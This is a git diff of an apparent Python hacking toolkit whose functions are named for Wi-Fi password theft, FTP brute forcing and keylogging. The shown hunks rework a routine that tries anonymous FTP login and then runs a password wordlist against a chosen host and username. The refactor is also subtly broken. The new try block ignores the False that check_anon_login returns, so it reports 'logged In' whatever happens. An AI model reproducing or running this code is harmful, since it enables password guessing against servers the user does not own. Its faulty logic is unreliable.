@@ -28,9 +28,9 @@ def wifi_password_stealer():
 def brute_forcer():
     host = input("Enter the hostname/ip: ")
     username = input("Enter the username: ")
-    passwordlist = input("Enter the filename/path of the wordlist: ")
+    password_list = input("Enter the filename/path of the wordlist: ")
 
-    def check_anon_login(host):
+    def check_anon_login():
         try:
             with FTP(host) as ftp:
                 ftp.login()
@@ -39,8 +39,8 @@ def brute_forcer():
             print(err)
             return False
 
-    def ftp_buster(host, username, passwordlist):
-        with open(passwordlist, "r") as passwd_file:
+    def ftp_buster():
+        with open(password_list, "r") as passwd_file:
             for password in passwd_file.readlines():
                 password = password.strip()
                 with FTP(host=host, timeout=0.1) as ftp:
@@ -52,11 +52,12 @@ def brute_forcer():
                         print(f"Trying...:{password}", e)
                         continue
 
-    if check_anon_login(host=host):
+    try:
+        check_anon_login()
         print("logged In")
-    else:
-        print("Anonymous login failed, Trying to brute force the password")
-        ftp_buster(host=host, username=username, passwordlist=passwordlist)
+    except Exception as error:
+        print(f"Anonymous login failed! {error}\nTrying to brute force the password...")
+        ftp_buster()
 
 
 def key_logger():
@@ -98,4 +99,5 @@ def run():
         key_logger()
 
 
-run()
+if __name__ == "__main__":
+    run()
